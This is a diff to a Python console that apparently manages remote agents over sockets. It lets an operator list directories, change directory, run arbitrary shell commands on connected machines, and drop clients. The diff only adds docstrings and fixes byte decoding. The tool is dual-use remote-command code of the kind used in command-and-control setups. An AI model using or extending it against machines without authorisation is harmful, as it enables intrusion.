@@ -14,11 +14,13 @@ class Agent(cmd.Cmd):
         self.prompt = f'{colorama.Fore.BLUE}{self.remote_addr} >{colorama.Style.RESET_ALL}'
 
     def do_ls(self, args):
+        '''list directory contents'''
         self.socket.sendall('ls {}'.format(args).encode())
         result = read(self.socket)
         print(result)
 
     def do_cd(self, args: str):
+        '''change directory'''
         args = args.strip()
         if not args:
             print('no argument')
@@ -28,6 +30,7 @@ class Agent(cmd.Cmd):
         print(result)
 
     def do_delete(self, args):
+        '''delete current agent & return'''
         self.server.delete_client(self.socket.getpeername())
         return True
 
@@ -44,11 +47,13 @@ class Agent(cmd.Cmd):
         print(result)
 
     def do_pwd(self, args):
+        '''print current directory'''
         self.socket.sendall(b'pwd')
         result = read(self.socket)
         print(result)
 
     def do_shell(self, args: str):
+        '''run command'''
         args = args.strip()
         if not args:
             print('no argument')
@@ -146,14 +151,14 @@ class Server(cmd.Cmd):
         return
 
 def read(s: 'socket.socket', bufsize=4096):
-    result = ''
+    result = b''
     while True:
         part = s.recv(bufsize)
-        result += part.decode()
+        result += part
         ready, _, _ = select.select([s], [], [], 0)
         if not ready:
             break
-    return result
+    return result.decode()
 
 if __name__ == '__main__':
     colorama.init()
